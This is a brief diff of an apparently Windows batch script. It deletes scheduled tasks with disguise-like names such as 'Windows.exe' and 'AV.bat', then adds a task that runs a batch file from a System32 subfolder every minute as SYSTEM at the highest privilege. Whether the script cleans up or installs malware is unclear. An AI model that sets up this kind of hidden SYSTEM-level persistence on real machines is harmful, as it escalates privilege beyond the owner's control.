@@ -18,5 +18,5 @@ powershell -Command "Unregister-ScheduledTask -TaskName 'Windows.exe' -Confirm:$
 powershell -Command "Unregister-ScheduledTask -TaskName 'AV.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'Update.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'uninstallTEMP' -Confirm:$false"
-
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\uninstall.bat" /TN "installTEMP" /RL HIGHEST /RU SYSTEM
 exit
